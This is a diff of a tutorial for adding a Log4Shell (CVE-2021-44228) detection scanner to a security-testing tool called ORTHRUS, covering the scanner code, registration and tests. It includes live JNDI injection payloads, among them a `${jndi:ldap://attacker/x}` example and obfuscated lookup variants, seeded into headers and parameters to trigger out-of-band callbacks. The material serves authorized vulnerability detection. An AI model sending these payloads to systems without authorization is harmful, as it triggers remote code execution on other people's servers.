@@ -2,13 +2,13 @@
 
 This tutorial walks you from an empty file to a **registered, tested Log4Shell
 (CVE-2021-44228 / JNDI injection) scanner** in ORTHRUS. Every class, method, and
-import below matches the real codebase — you can copy-paste it and it will run.
+import below matches the real codebase - you can copy-paste it and it will run.
 
 By the end you'll have:
 
-- `orthrus/scanners/log4shell.py` — the scanner
-- one line in `orthrus/scanners/__init__.py` — the registration hook
-- `tests/unit/test_log4shell.py` — a pure unit test
+- `orthrus/scanners/log4shell.py` - the scanner
+- one line in `orthrus/scanners/__init__.py` - the registration hook
+- `tests/unit/test_log4shell.py` - a pure unit test
 - a green `ruff` + `pytest` run and a PR-ready branch
 
 > **Authorized use only.** ORTHRUS sends real attack payloads. Only run it against
@@ -28,16 +28,16 @@ async def scan(self, ctx: ScanContext) -> AsyncIterator[Finding]:
     yield Finding(...)
 ```
 
-- It receives a single [`ScanContext`](../orthrus/core/context.py) — the shared,
+- It receives a single [`ScanContext`](../orthrus/core/context.py) - the shared,
   wired-up per-scan state. The pieces you'll use:
-  - `ctx.endpoints` — the discovered `Endpoint` inventory (URLs + their params).
-  - `ctx.http` — the **scope-enforced** async HTTP client. Every request routed
+  - `ctx.endpoints` - the discovered `Endpoint` inventory (URLs + their params).
+  - `ctx.http` - the **scope-enforced** async HTTP client. Every request routed
     through it is checked against the engagement scope *before* it leaves. Never
     use raw `httpx`; that's how the safety boundary stays load-bearing.
-  - `ctx.callback` — the out-of-band (OOB) collaborator, or `None`. This is the
+  - `ctx.callback` - the out-of-band (OOB) collaborator, or `None`. This is the
     heart of blind-vuln detection (see below).
-  - `ctx.config.aggressiveness` — the operator's intensity dial.
-  - `ctx.store` — persistence; we record callback hits here.
+  - `ctx.config.aggressiveness` - the operator's intensity dial.
+  - `ctx.store` - persistence; we record callback hits here.
 - It **yields** [`Finding`](../orthrus/core/schemas.py) objects (pydantic models).
   A scanner is a generator, so it can stream findings as it goes.
 
@@ -54,7 +54,7 @@ Three class attributes describe the scanner to the orchestrator:
 ORTHRUS separates **detection** from **confirmation**:
 
 - A **scanner** (`orthrus/scanners/`) *detects* and emits a `Finding`. The
-  strongest confidence a scanner sets is `Confidence.FIRM` —
+  strongest confidence a scanner sets is `Confidence.FIRM` -
   `Confidence.CONFIRMED` is reserved for the exploitation phase.
 - A **confirmer** (`orthrus/exploits/`, subclass of
   [`BaseExploit`](../orthrus/exploits/base_exploit.py)) takes that `Finding` and
@@ -69,7 +69,7 @@ SSRF). We build the scanner here and point you at the confirmer in
 
 > Log4Shell is also matched **passively** today: the version-fingerprint scanner
 > [`product_cve.py`](../orthrus/scanners/product_cve.py) already carries
-> `KnownCve("CVE-2021-44228", 10.0, "Log4Shell — log4j2 JNDI lookup RCE")`. That
+> `KnownCve("CVE-2021-44228", 10.0, "Log4Shell - log4j2 JNDI lookup RCE")`. That
 > flags *vulnerable-looking versions*; the scanner you're about to write actively
 > **proves exploitability**. They complement each other.
 
@@ -79,7 +79,7 @@ SSRF). We build the scanner here and point you at the confirmer in
 
 Log4Shell is **blind and out-of-band**. When a vulnerable log4j2 logs
 attacker-controlled text containing `${jndi:ldap://attacker/x}`, it *resolves and
-fetches* that JNDI reference — reaching out to the attacker's server. There is no
+fetches* that JNDI reference - reaching out to the attacker's server. There is no
 tell in the HTTP response. So detection is purely the callback:
 
 1. Mint a unique callback token per probe (`ctx.callback.new_token()`).
@@ -92,7 +92,7 @@ tell in the HTTP response. So detection is purely the callback:
 > --callback …`), JNDI's *DNS resolution alone* of the unique subdomain registers
 > the hit, so `ldap://`, `rmi://`, and `dns://` variants all work. The bundled
 > local HTTP listener only sees HTTP callbacks, so run Log4Shell against an
-> Interactsh server for full coverage. The scanner code below is agnostic — it
+> Interactsh server for full coverage. The scanner code below is agnostic - it
 > just calls the [`CallbackClient`](../orthrus/core/callback.py) interface.
 
 The closest existing templates are the OOB paths in
@@ -114,7 +114,7 @@ pure payload helpers, then the class.
 Blind and out-of-band by nature: a vulnerable log4j2 evaluates a
 ``${jndi:ldap://…}`` lookup it finds in *logged* attacker input (a header, a
 query/body value) and reaches out to the attacker's server. There is no response
-signal, so detection is purely the callback — seed a per-probe token into the
+signal, so detection is purely the callback - seed a per-probe token into the
 classic header and parameter sinks, then poll the OOB collaborator for a hit.
 Pairs with an ``orthrus/exploits`` confirmer that re-proves it with a fresh token.
 """
@@ -151,7 +151,7 @@ MAX_ENDPOINTS = 60          # cap header probes (one per unique endpoint)
 MAX_POINTS = 60             # cap parameter probes
 POLL_DELAY = 3.0            # seconds to wait before polling the collaborator
 
-# Request headers a server most often passes verbatim into a log line — the
+# Request headers a server most often passes verbatim into a log line - the
 # classic Log4Shell sinks. We seed them together so one request covers them all.
 JNDI_HEADERS = (
     "User-Agent",
@@ -169,11 +169,11 @@ The `_injection` helpers do a lot of heavy lifting for us:
 `(method, path, location, param)` injectable across the inventory, `send(ctx,
 point, value)` places a payload in the right spot (query / body / JSON / path)
 and dispatches it through `ctx.http`, and `used_url(point, value)` renders the
-URL a probe targeted — all scope-checked.
+URL a probe targeted - all scope-checked.
 
 ### 3b. Pure payload builders (unit-testable, no network)
 
-Keep detection logic as pure functions where you can — they test without a socket.
+Keep detection logic as pure functions where you can - they test without a socket.
 
 ```python
 def callback_authority(callback_url: str) -> str:
@@ -197,9 +197,9 @@ def jndi_payloads(authority: str, token: str) -> list[str]:
         f"${{jndi:ldap://{target}}}",
         f"${{jndi:rmi://{target}}}",
         f"${{jndi:dns://{target}}}",
-        # ${${lower:j}ndi:${lower:l}dap://…}  — case-folding lookup obfuscation
+        # ${${lower:j}ndi:${lower:l}dap://…}  - case-folding lookup obfuscation
         f"${{${{lower:j}}ndi:${{lower:l}}dap://{target}}}",
-        # ${${::-j}${::-n}${::-d}${::-i}:ldap://…}  — default-value spelling of "jndi"
+        # ${${::-j}${::-n}${::-d}${::-i}:ldap://…}  - default-value spelling of "jndi"
         f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{target}}}",
     ]
 ```
@@ -231,7 +231,7 @@ def _finding(probe: _Probe, hit: Interaction) -> Finding:
             f"A ${{jndi:ldap://…}} lookup placed in {probe.vector} triggered an out-of-band "
             f"{hit.protocol.upper()} callback from {hit.source_ip}. The target logged attacker "
             "input through a JNDI-enabled log4j2 sink (CVE-2021-44228) and performed the "
-            "attacker-controlled lookup — this is unauthenticated remote code execution."
+            "attacker-controlled lookup - this is unauthenticated remote code execution."
         ),
         remediation=(
             "Upgrade log4j2 to 2.17.1+ (or the patched build for your major line). As interim "
@@ -340,13 +340,13 @@ __all__ = ["Log4ShellScanner", "callback_authority", "jndi_payloads", "JNDI_HEAD
 **What's going on:**
 
 - We seed **headers** by calling `ctx.http.request(method, url, headers=…)`
-  directly — the scope-enforced client supports a `headers` keyword (same call
+  directly - the scope-enforced client supports a `headers` keyword (same call
   [`host_header_confirm.py`](../orthrus/exploits/host_header_confirm.py) uses).
 - We seed **parameters** with the shared `send()` helper, mirroring
   `cmd_injection._oob_based`.
 - One `token` per probe means a callback hit maps back to the exact
   header/parameter that carried it.
-- We record the hit via `ctx.store.add_callback(...)` before yielding — the same
+- We record the hit via `ctx.store.add_callback(...)` before yielding - the same
   bookkeeping SSRF and command-injection do.
 - The finding is `CRITICAL` / `FIRM` with `cwe="CWE-917"` (Expression-Language /
   JNDI injection, NVD's primary CWE for CVE-2021-44228).
@@ -370,7 +370,7 @@ from orthrus.scanners import (  # noqa: F401  (registration side-effects)
 ```
 
 The [`@register`](../orthrus/scanners/registry.py) decorator keys the class into
-`SCANNER_REGISTRY` by its `name`. That's the whole mechanism — no entry points,
+`SCANNER_REGISTRY` by its `name`. That's the whole mechanism - no entry points,
 no config. Verify it's discoverable:
 
 ```bash
@@ -533,7 +533,7 @@ A few things worth calling out:
 - **`monkeypatch.setattr(l4s, "send", fake_send)`** swaps the module-level `send`
   the scanner imported, so no real socket is opened. `l4s.asyncio.sleep` is
   patched out so the 3-second poll delay doesn't slow the suite.
-- `injection_points()` and `used_url()` run for real against the `Endpoint` — they
+- `injection_points()` and `used_url()` run for real against the `Endpoint` - they
   need no network, which is exactly why the injection plumbing lives in pure
   helpers.
 
@@ -548,7 +548,7 @@ A few things worth calling out:
 
 ## 6. Run the quality gates
 
-CI runs exactly two checks — run them locally before opening a PR:
+CI runs exactly two checks - run them locally before opening a PR:
 
 ```bash
 ruff check orthrus tests      # E,F,I,UP,B,ASYNC · line-length 100
@@ -581,11 +581,11 @@ PR conventions (from `CONTRIBUTING.md`):
 - Branch off `main`, keep the PR focused.
 - **Conventional Commits** (`feat:`, `fix:`, `docs:` …).
 - Describe *what* and *why*; include the tests (done).
-- If you added a new `vuln_type` (we did — `log4shell`), consider a remediation
+- If you added a new `vuln_type` (we did - `log4shell`), consider a remediation
   entry in [`orthrus/reporting/patches.py`](../orthrus/reporting/patches.py) and
   update any scanner counts in `README.md` / `docs/PRD.md`.
 - Follow the **red / white / black** palette rule for any report/UI surface
-  (`orthrus/utils/palette.py`) — not relevant to this scanner, but it's the house
+  (`orthrus/utils/palette.py`) - not relevant to this scanner, but it's the house
   style.
 
 ---
@@ -604,7 +604,7 @@ class Log4ShellConfirm(BaseExploit):
 
     async def confirm(self, ctx: ScanContext, finding: Finding) -> ExploitResult:
         # Mint a FRESH callback token, replay the JNDI payload, poll, and return
-        # ExploitResult(success=True, ...) on a hit — never emit the callback data
+        # ExploitResult(success=True, ...) on a hit - never emit the callback data
         # beyond proof. See ssrf_confirm.py for the exact shape.
         ...
 ```
